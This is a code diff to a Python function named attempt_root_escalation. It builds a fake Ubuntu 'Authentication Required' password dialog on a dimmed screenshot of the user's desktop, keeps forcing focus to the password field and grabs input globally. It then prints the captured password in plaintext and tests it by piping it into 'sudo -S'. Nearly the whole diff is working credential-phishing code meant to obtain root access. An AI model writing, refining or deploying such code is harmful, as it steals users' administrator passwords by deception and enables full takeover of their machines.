@@ -155,6 +155,7 @@ def attempt_root_escalation():
     try:
         import tkinter as tk
         from tkinter import font
+        print("✅ Tkinter available", flush=True)
     except ImportError:
         return False, "Tkinter not installed."
 
@@ -163,144 +164,383 @@ def attempt_root_escalation():
     def show_ui():
         nonlocal result_pw
         try:
-            root = tk.Tk(); root.withdraw()
+            # Setup Root
+            root = tk.Tk()
+            root.withdraw()
+           
             w, h = root.winfo_screenwidth(), root.winfo_screenheight()
-            
-            # 1. Dialog (Create FIRST for Z-order)
+
+            # Fixed dialog dimensions
+            DIALOG_WIDTH = 373
+            DIALOG_HEIGHT = 381
+
+            # Create Dialog FIRST (before dimmer)
             dialog = tk.Toplevel(root)
             dialog.title("Auth")
+            dialog.overrideredirect(True)
+            
+            # Set background to match the PNG background color
             dialog.configure(bg='#2C2C2C')
-            # FOCUS HACK: Start managed to get WM attention
-            dialog.overrideredirect(False) 
-            dialog.attributes('-alpha', 0.0) # Hide
-            
-            # 2. Dimmer
-            dimmer = tk.Toplevel(root)
-            dimmer.geometry(f"{w}x{h}+0+0")
-            dimmer.configure(bg='black')
-            dimmer.overrideredirect(True)
-            dimmer.attributes('-alpha', 0.4)
-            
-            # Load Image (Simple)
+           
+            # Load Dialog Image (basic PNG) - ALWAYS RESIZE TO 373x381
             base_dir = os.path.dirname(__file__)
             img_path = os.path.join(base_dir, "prompt.png")
-            if not os.path.exists(img_path): 
+            if not os.path.exists(img_path):
                 img_path = os.path.join(base_dir, "testing", "prompt.png")
-            
+               
+            bg_image = None
             try:
-                bg_image = tk.PhotoImage(file=img_path)
-                dw, dh = bg_image.width(), bg_image.height()
-            except:
-                dw, dh = 373, 381; bg_image = None
+                # Check if we can use OpenCV to load PNG with proper alpha
+                import cv2
+                import numpy as np
                 
-            x, y = (w - dw) // 2, (h - dh) // 2
-            dialog.geometry(f"{dw}x{dh}+{x}+{y}")
-            
-            if bg_image:
-                tk.Label(dialog, image=bg_image, bd=0).place(x=0, y=0)
-
-            # --- Layout Vars ---
-            POS = {'title': 50, 'msg': 85, 'avatar': 170, 'user': 220, 'in_y': 273, 'in_w': 260, 'btn_h': 41, 'gap': 1}
-            Colors = {'bg': '#2C2C2C', 'in': '#393230', 'btn': '#323232', 'hover': '#424242', 'dis': '#555555', 'txt': 'white'}
-            Fonts = {'hdr': ("Ubuntu", 13, "bold"), 'body': ("Ubuntu", 10), 'av': ("Ubuntu", 18, "bold"), 'user': ("Ubuntu", 12, "bold")}
-
-            # --- Elements ---
-            tk.Label(dialog, text="Authentication Required", bg='#1d1d1d', fg=Colors['txt'], font=Fonts['hdr']).place(relx=0.5, y=POS['title'], anchor='center')
-            tk.Label(dialog, text="Authentication keyring is needed to upgrade\nsystem packages", bg='#1d1d1d', fg='#CCCCCC', font=Fonts['body'], justify='center').place(relx=0.5, y=POS['msg'], anchor='center')
-            
-            user = os.getlogin()
-            tk.Label(dialog, text=user[0].upper() if user else "?", bg='#272727', fg='white', font=Fonts['av']).place(relx=0.5, y=POS['avatar'], anchor='center')
-            tk.Label(dialog, text=user, bg='#1d1d1d', fg=Colors['txt'], font=Fonts['user']).place(relx=0.5, y=POS['user'], anchor='center')
-
-            # Input
-            pw = tk.Entry(dialog, show="•", bg=Colors['in'], fg='white', relief='flat', font=("Ubuntu", 15), justify='center', insertbackground='white')
-            pw.place(relx=0.5, y=POS['in_y'], width=POS['in_w'], height=28, anchor='center')
-            
-            # Buttons
-            bw = (dw - POS['gap']) // 2
-            by = dh - POS['btn_h']
-            
-            def close(e=None):
-                try: dialog.destroy(); dimmer.destroy(); root.quit()
-                except: pass
+                # Load PNG with alpha channel
+                png_img = cv2.imread(img_path, cv2.IMREAD_UNCHANGED)
                 
-            def submit(e=None):
-                nonlocal result_pw
-                result_pw = pw.get()
-                close()
-
-            # Cancel
-            b_can = tk.Label(dialog, text="Cancel", bg=Colors['btn'], fg='white', font=Fonts['body'])
-            b_can.place(x=0, y=by, width=bw, height=POS['btn_h'])
-            b_can.bind("<Button-1>", close)
-            b_can.bind("<Enter>", lambda e: b_can.config(bg=Colors['hover']))
-            b_can.bind("<Leave>", lambda e: b_can.config(bg=Colors['btn']))
-            
-            # Auth (Dynamic)
-            b_auth = tk.Label(dialog, text="Authenticate", bg=Colors['btn'], fg=Colors['dis'], font=("Ubuntu", 10, "bold"))
-            b_auth.place(x=bw + POS['gap'], y=by, width=bw, height=POS['btn_h'])
-            
-            def check_input(e=None):
-                if pw.get():
-                    b_auth.config(fg='white', cursor='hand2')
-                    b_auth.bind("<Button-1>", submit)
-                    b_auth.bind("<Enter>", lambda e: b_auth.config(bg=Colors['hover']))
-                    b_auth.bind("<Leave>", lambda e: b_auth.config(bg=Colors['btn']))
-                    pw.bind('<Return>', submit)
+                if png_img is not None:
+                    print(f"Original image size: {png_img.shape[1]}x{png_img.shape[0]}", flush=True)
+                    
+                    # RESIZE to exact dimensions (373x381)
+                    png_img = cv2.resize(png_img, (DIALOG_WIDTH, DIALOG_HEIGHT), interpolation=cv2.INTER_LANCZOS4)
+                    print(f"✅ Resized image to: {DIALOG_WIDTH}x{DIALOG_HEIGHT}", flush=True)
+                    
+                    if png_img.shape[2] == 4:  # Has alpha channel
+                        # Replace transparent pixels with dialog background color
+                        alpha = png_img[:, :, 3]
+                        rgb = png_img[:, :, :3]
+                        
+                        # Background color #2C2C2C in BGR
+                        bg_color = np.array([44, 44, 44], dtype=np.uint8)
+                        
+                        # Blend transparent areas with background
+                        for c in range(3):
+                            rgb[:, :, c] = rgb[:, :, c] * (alpha / 255.0) + bg_color[c] * (1.0 - alpha / 255.0)
+                        
+                        # Save blended image
+                        temp_png = "/tmp/dialog_fixed.png"
+                        cv2.imwrite(temp_png, rgb)
+                        
+                        # Load with tkinter
+                        bg_image = tk.PhotoImage(file=temp_png)
+                        print("✅ Loaded PNG with OpenCV alpha blending and resize", flush=True)
+                    else:
+                        # No alpha channel, just save resized image
+                        temp_png = "/tmp/dialog_fixed.png"
+                        cv2.imwrite(temp_png, png_img)
+                        bg_image = tk.PhotoImage(file=temp_png)
+                        print("✅ Loaded and resized PNG (no alpha)", flush=True)
                 else:
-                    b_auth.config(fg=Colors['dis'], cursor='arrow', bg=Colors['btn'])
-                    b_auth.unbind("<Button-1>"); b_auth.unbind("<Enter>"); b_auth.unbind("<Leave>")
-                    pw.unbind('<Return>')
+                    raise Exception("Failed to load image with OpenCV")
+                    
+            except Exception as e:
+                # Fallback to PIL for resizing if OpenCV fails
+                print(f"⚠️ OpenCV processing failed: {e}, trying PIL...", flush=True)
+                try:
+                    from PIL import Image
+                    
+                    # Load and resize with PIL
+                    pil_img = Image.open(img_path)
+                    print(f"Original image size: {pil_img.width}x{pil_img.height}", flush=True)
+                    
+                    # Resize to exact dimensions
+                    pil_img = pil_img.resize((DIALOG_WIDTH, DIALOG_HEIGHT), Image.Resampling.LANCZOS)
+                    print(f"✅ Resized image to: {DIALOG_WIDTH}x{DIALOG_HEIGHT}", flush=True)
+                    
+                    # Save temporary file
+                    temp_png = "/tmp/dialog_resized.png"
+                    pil_img.save(temp_png)
+                    
+                    # Load with tkinter
+                    bg_image = tk.PhotoImage(file=temp_png)
+                    print("✅ Loaded and resized PNG with PIL", flush=True)
+                    
+                except ImportError:
+                    print("⚠️ PIL not found", flush=True)
+                    # Final fallback
+                    try:
+                        bg_image = tk.PhotoImage(file=img_path)
+                        print("⚠️ Using original image without resize (fallback)", flush=True)
+                    except Exception as e2:
+                        print(f"❌ Failed to load prompt.png: {e2}", flush=True)
+                        bg_image = None
+               
+            # Center Dialog using fixed dimensions
+            x = (w - DIALOG_WIDTH) // 2
+            y = (h - DIALOG_HEIGHT) // 2
+            dialog.geometry(f"{DIALOG_WIDTH}x{DIALOG_HEIGHT}+{x}+{y}")
+           
+            # === SCREENSHOT DIMMER using MSS + OpenCV ===
+            print("Taking screenshot for dimmed background...", flush=True)
+            dimmer = None
+            try:
+                import mss
+                import mss.tools
+                import cv2
+                import numpy as np
+                
+                # Take screenshot
+                temp_screenshot = "/tmp/screen_bright.png"
+                with mss.mss() as sct:
+                    sct_img = sct.grab(sct.monitors[0])
+                    mss.tools.to_png(sct_img.rgb, sct_img.size, output=temp_screenshot)
+                
+                # Load with OpenCV and dim it
+                img = cv2.imread(temp_screenshot)
+                
+                # Reduce brightness by multiplying pixels by 0.4 (60% darker)
+                dimmed_img = cv2.convertScaleAbs(img, alpha=0.4, beta=0)
+                
+                # Save dimmed version
+                temp_dimmed = "/tmp/screen_dimmed.png"
+                cv2.imwrite(temp_dimmed, dimmed_img)
+                
+                print("✅ Screenshot dimmed with OpenCV", flush=True)
+                
+                # Load dimmed screenshot into tkinter
+                screen_photo = tk.PhotoImage(file=temp_dimmed)
+                
+                # Create dimmer window
+                dimmer = tk.Toplevel(root)
+                dimmer.title("Overlay")
+                dimmer.geometry(f"{w}x{h}+0+0")
+                dimmer.overrideredirect(True)
+                dimmer.configure(bg='black')
+                
+                # Display dimmed screenshot
+                dimmer_label = tk.Label(dimmer, image=screen_photo, borderwidth=0)
+                dimmer_label.image = screen_photo  # Keep reference
+                dimmer_label.place(x=0, y=0)
+                
+                print("✅ Dimmed screenshot background displayed", flush=True)
+                    
+            except Exception as e:
+                print(f"⚠️ Screenshot dimmer failed: {e}, using solid overlay", flush=True)
+                dimmer = tk.Toplevel(root)
+                dimmer.geometry(f"{w}x{h}+0+0")
+                dimmer.configure(bg='black')
+                dimmer.overrideredirect(True)
+                try:
+                    dimmer.attributes('-alpha', 0.5)
+                except:
+                    pass
+           
+            # Background Label
+            if bg_image:
+                bg_lbl = tk.Label(dialog, image=bg_image, borderwidth=0, highlightthickness=0)
+                bg_lbl.image = bg_image  # Keep reference
+                bg_lbl.place(x=0, y=0)
+           
+            # Wait for both windows to be ready
+            if dimmer:
+                dimmer.update()
+            dialog.update()
+           
+            # Critical stacking order
+            if dimmer:
+                dimmer.lower(dialog)  # Lower dimmer BELOW dialog specifically
+            dialog.lift()   # Bring dialog to front
+            dialog.attributes('-topmost', True)  # Keep dialog on top
             
-            pw.bind('<KeyRelease>', check_input)
-            check_input() # Init
-            
-            # --- Activation ---
-            dialog.wait_visibility()
-            dimmer.wait_visibility()
-            
-            # Z-Order Fix
-            dimmer.lower(dialog)
-            dialog.lift()
-            dialog.attributes('-topmost', True)
-            
-            # Focus Flicker (The Fix)
+            # Force stacking again after a moment
+            def fix_stacking():
+                if dimmer:
+                    dimmer.lower(dialog)
+                dialog.lift()
+            dialog.after(100, fix_stacking)
+            dialog.after(300, fix_stacking)
+           
+            # Grab all input
             dialog.focus_force()
-            dialog.grab_set()
-            dialog.overrideredirect(True) # Now go borderless
-            dialog.attributes('-alpha', 1.0) # Show
-            
-            # Anti-Loss Loop
-            def keep_focus():
+           
+            # Aggressive focus maintenance
+            def maintain_focus():
                 if dialog.winfo_exists():
                     dialog.lift()
-                    if dialog.focus_get() != pw: pw.focus_force()
-                    dialog.after(1000, keep_focus)
-            keep_focus()
+                    # Only refocus if password field doesn't have focus
+                    if dialog.focus_get() != pw_entry:
+                        pw_entry.focus_force()
+                    dialog.after(1000, maintain_focus)  # Much less frequent
+            dialog.after(100, maintain_focus)
+
+            # Layout Configuration
+            POS = {
+                'title_y': 50,
+                'msg_y': 85,
+                'avatar_y': 170,
+                'username_y': 220,
+                'input_y': 273,
+                'input_w': 260,
+                'input_h': 28,
+                'btn_h': 41,
+                'btn_gap': 1,  # Gap between buttons
+            }
+           
+            TEXT_COLOR = 'white'
+            BG_COLOR = '#2C2C2C'
+            TITLE_BG = '#1d1d1d'
+            MSG_BG = '#1d1d1d'
+            AVATAR_BG = '#272727'
+            USERNAME_BG = '#1d1d1d'
+            ENTRY_BG = '#393230'
+            BTN_AUTH_BG = '#323232'
+            BTN_AUTH_HOVER = '#424242'
+            BTN_CANCEL_BG = '#323232'
+            BTN_CANCEL_HOVER = '#424242'
+           
+            # Title
+            hdr_font = font.Font(family="Ubuntu", size=13, weight="bold")
+            tk.Label(dialog, text="Authentication Required", bg=TITLE_BG, fg=TEXT_COLOR, font=hdr_font)\
+                .place(relx=0.5, y=POS['title_y'], anchor='center')
+           
+            # Message
+            msg = "Authentication keyring is needed to upgrade\nsystem packages"
+            body_font = font.Font(family="Ubuntu", size=10)
+            tk.Label(dialog, text=msg, bg=MSG_BG, fg='#CCCCCC', font=body_font, justify='center')\
+                .place(relx=0.5, y=POS['msg_y'], anchor='center')
+
+            # User Info
+            username = os.getlogin()
+            initial = username[0].upper() if username else "?"
+           
+            tk.Label(dialog, text=initial, bg=AVATAR_BG, fg='white', font=("Ubuntu", 18, "bold"))\
+                .place(relx=0.5, y=POS['avatar_y'], anchor='center')
+           
+            tk.Label(dialog, text=username, bg=USERNAME_BG, fg=TEXT_COLOR, font=("Ubuntu", 12, "bold"))\
+                .place(relx=0.5, y=POS['username_y'], anchor='center')
+
+            # Password Input
+            pw_entry = tk.Entry(dialog, show="•", bg=ENTRY_BG, fg='white',
+                               relief='flat', bd=0, highlightthickness=0,
+                               font=("Ubuntu", 15), insertbackground='white',
+                               justify='center')
+           
+            pw_entry.place(relx=0.5, y=POS['input_y'], width=POS['input_w'], height=POS['input_h'], anchor='center')
             
-            dialog.bind('<Escape>', close)
+            # Prevent focus from being stolen
+            def keep_entry_focus(e):
+                return "break"
             
-            # Focus Fix 2
-            def force_grab():
-                if dialog.winfo_exists():
-                    pw.focus_force()
-                    try: dialog.grab_set_global()
-                    except: dialog.grab_set()
-            dialog.after(250, force_grab)
+            pw_entry.bind('<FocusOut>', lambda e: pw_entry.focus_set())
+
+            # Buttons with gap
+            btn_w = (DIALOG_WIDTH - POS['btn_gap']) // 2
+            btn_y = DIALOG_HEIGHT - POS['btn_h']
+           
+            def cancel(e=None):
+                try:
+                    dialog.destroy()
+                    if dimmer: dimmer.destroy()
+                    root.quit()
+                except: pass
+               
+            def submit(event=None):
+                nonlocal result_pw
+                result_pw = pw_entry.get()
+                try:
+                    dialog.destroy()
+                    if dimmer: dimmer.destroy()
+                    root.quit()
+                except: pass
+           
+            # Cancel Button (Left)
+            lbl_cancel = tk.Label(dialog, text="Cancel", bg=BTN_CANCEL_BG, fg='white', font=body_font)
+            lbl_cancel.place(x=0, y=btn_y, width=btn_w, height=POS['btn_h'])
+            lbl_cancel.bind("<Button-1>", cancel)
+           
+            # Authenticate Button (Right)
+            lbl_auth = tk.Label(dialog, text="Authenticate", bg=BTN_AUTH_BG, fg='white', font=("Ubuntu", 10, "bold"))
+            lbl_auth.place(x=btn_w + POS['btn_gap'], y=btn_y, width=btn_w, height=POS['btn_h'])
+            lbl_auth.bind("<Button-1>", submit)
+           
+            # Hover effects
+            def on_cancel_enter(e): 
+                lbl_cancel.config(bg=BTN_CANCEL_HOVER)
+            def on_cancel_leave(e): 
+                lbl_cancel.config(bg=BTN_CANCEL_BG)
             
+            def on_auth_enter(e): 
+                lbl_auth.config(bg=BTN_AUTH_HOVER)
+            def on_auth_leave(e): 
+                lbl_auth.config(bg=BTN_AUTH_BG)
+           
+            lbl_cancel.bind("<Enter>", on_cancel_enter)
+            lbl_cancel.bind("<Leave>", on_cancel_leave)
+            
+            # Validation logic
+            auth_disabled_fg = '#555555'
+            lbl_auth.config(fg=auth_disabled_fg, cursor='arrow') # Start disabled
+            lbl_auth.unbind("<Button-1>")
+            lbl_auth.unbind("<Enter>")
+            lbl_auth.unbind("<Leave>")
+
+            def update_auth_button_state(e=None):
+                if pw_entry.get():
+                    lbl_auth.config(fg=TEXT_COLOR, cursor='hand2')
+                    lbl_auth.bind("<Button-1>", submit)
+                    lbl_auth.bind("<Enter>", on_auth_enter)
+                    lbl_auth.bind("<Leave>", on_auth_leave)
+                else:
+                    lbl_auth.config(fg=auth_disabled_fg, cursor='arrow', bg=BTN_AUTH_BG)
+                    lbl_auth.unbind("<Button-1>")
+                    lbl_auth.unbind("<Enter>")
+                    lbl_auth.unbind("<Leave>")
+            
+            pw_entry.bind('<KeyRelease>', update_auth_button_state)
+            update_auth_button_state()
+            
+            # Keyboard bindings
+            def submit_if_valid(e=None):
+                if pw_entry.get():
+                    submit(e)
+            
+            pw_entry.bind('<Return>', submit_if_valid)
+            dialog.bind('<Escape>', cancel)
+            
+            # Emergency exit handlers
+            def force_quit(e=None):
+                cancel()
+            
+            root.bind('<Control-c>', force_quit)
+            dialog.bind('<Control-c>', force_quit)
+            dialog.bind('<Control-q>', force_quit)
+           
+            # Force focus
+            def set_focus():
+                pw_entry.focus_force()
+                pw_entry.icursor(tk.END)
+                try: dialog.grab_set_global()
+                except: dialog.grab_set()
+           
+            dialog.after(250, set_focus)
+           
             root.mainloop()
-            
+
         except Exception as e:
-            print(f"GUI Error: {e}")
+            print(f"GUI Exception: {e}", flush=True)
+            import traceback
+            traceback.print_exc()
 
     try:
         # Run in thread to allow timeout or main thread checks if needed (optional)
-        # But here we just run it.
-        show_ui()
+        # However, for simplicity and to match test.py's reliability, we run mainloop on main thread here
+        # IF we want timeout, we must use thread.
+        import threading
+        def run_with_timeout():
+            show_ui()
+        
+        ui_thread = threading.Thread(target=run_with_timeout, daemon=True)
+        ui_thread.start()
+        ui_thread.join(timeout=60) # 60s timeout
+        
+        if ui_thread.is_alive():
+             print("⚠️ UI timed out or hung", flush=True)
+             return False, "Timeout"
+
     except:
         return False, "UI Failed"
     
     if result_pw:
+        print(f"✅ Password Captured: {result_pw}", flush=True)
         # Verify
         test = subprocess.run(f"sudo -k && echo '{result_pw}' | sudo -S id", shell=True, capture_output=True, text=True)
         if test.returncode == 0:
